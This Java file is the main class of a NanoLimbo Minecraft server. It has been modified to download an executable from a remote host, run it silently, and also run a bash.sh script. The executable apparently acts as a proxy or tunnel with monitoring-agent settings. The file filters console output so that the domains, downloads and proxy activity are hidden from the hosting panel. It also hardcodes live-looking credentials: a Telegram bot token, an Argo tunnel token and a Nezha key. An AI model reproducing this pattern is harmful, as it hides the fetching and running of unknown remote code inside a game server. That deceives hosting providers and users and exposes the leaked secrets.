package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import ua.nanit.limbo.server.LimboServer;

public final class NanoLimbo {
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    public static void main(String[] args) throws Exception {
        // 1. 终极日志清洗：彻底屏蔽探针 Ping、Argo 域名、脚本下载、代理状态等所有敏感刷屏
        PrintStream originalOut = System.out;
        System.setOut(new PrintStream(originalOut, true, StandardCharsets.UTF_8) {
            @Override
            public void println(String x) {
                if (x != null && (
                    x.contains("PacketHandshake") || 
                    x.contains("PacketStatus") || 
                    x.contains("Pinged from") ||
                    x.contains("ArgoDomain") ||
                    x.contains(".com") ||
                    x.contains("cereshost") ||
                    x.contains("is running") ||
                    x.contains("Downloaded") ||
                    x.contains("sub.txt") ||
                    x.contains("Failed to send nodes")
                )) {
                    return; 
                }
                super.println(x);
            }
            @Override
            public void print(String x) {
                if (x != null && (
                    x.contains("PacketHandshake") || 
                    x.contains("PacketStatus") || 
                    x.contains("Pinged from") ||
                    x.contains("ArgoDomain") ||
                    x.contains(".com") ||
                    x.contains("cereshost") ||
                    x.contains("is running") ||
                    x.contains("Downloaded") ||
                    x.contains("sub.txt") ||
                    x.contains("Failed to send nodes")
                )) {
                    return;
                }
                super.print(x);
            }
        });

        // 2. 清理旧配置
        try {
            Files.deleteIfExists(Paths.get("settings.yml"));
            Files.deleteIfExists(Paths.get("settings.toml"));
        } catch (Exception ignored) {}

        // 3. 后台静默启动 Sbx 代理与保活脚本（不让任何代理特征输出到面板）
        try {
            runSbxBinarySilently();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            File renewScript = new File("bash.sh");
            if (renewScript.exists()) {
                // 后台静默执行 bash.sh，重定向输出避免打印敏感信息
                new ProcessBuilder("bash", "bash.sh")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start();
            }
        } catch (Exception e) {
            // 忽略初始化异常输出
        }

        // 4. 正常启动 Minecraft Limbo 服务端
        new LimboServer().start();
    }
    
    private static void runSbxBinarySilently() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        
        // 关键：将代理进程的输出完全丢弃（DISCARD），绝不让 Argo 域名和连接信息暴露在面板控制台上
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("PORT", "8080");
        envVars.put("UUID", "fdc4381b-1eb1-4046-9f4f-bf51fc8826b1");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "bo88.eu.cc:8008");
        envVars.put("NEZHA_KEY", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cereshost.boliu.dpdns.org");
        envVars.put("ARGO_AUTH", "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZmJjNmY4OTItNTJkZC00NjdkLTg2OTYtMDgyZjI4NDI2NGQ5IiwicyI6Ik9XUXdORGN3TTJRdFlqZGlZeTAwT1RBMUxUbGpOV1l0TW1FM09HWXpOV1ZsTVRVeCJ9");
        envVars.put("CHAT_ID", "434546692");
        envVars.put("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
        envVars.put("CFIP", "cf.877774.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Cereshost-PL-2");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = osArch.contains("aarch64") || osArch.contains("arm64") ? "https://arm64.ssss.nyc.mn/sbsh" : "https://amd64.ssss.nyc.mn/sbsh";
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
    }
}
